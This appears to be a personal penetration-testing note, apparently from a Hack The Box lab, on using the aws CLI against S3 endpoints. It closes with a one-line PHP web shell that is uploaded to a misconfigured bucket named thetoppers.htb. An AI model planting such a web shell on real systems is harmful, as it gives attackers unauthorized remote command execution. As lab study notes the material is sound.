S3 Buckets
#############

Date: 2024-11-13 13:26

Status:

Tags:

Description
***************

The tool to interact with s3 buckets is ``aws`` install with :

.. code-block:: console

   sudo apt install aws

The aws utility must be configured first, but you can just add the value
``temp`` on all the interactive prompts, it stores the config in your
home directory sub folder ``.aws``

.. code-block:: console

   aws configure

To list all S3 buckets on a resource try:

.. code-block:: console

   aws --endpoint=http://<hostname> s3 ls

For mis-configured buckets, you can copy files to the bucket:

.. code-block:: console

   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   aws --endpoint=http://<hostname> s3 cp shell.php s3://thetoppers.htb

References
************
https://docs.aws.amazon.com/AmazonS3/latest/userguide/website-hosting-custom-domain-walkthrough.html
https://github.com/sa7mon/S3Scanner
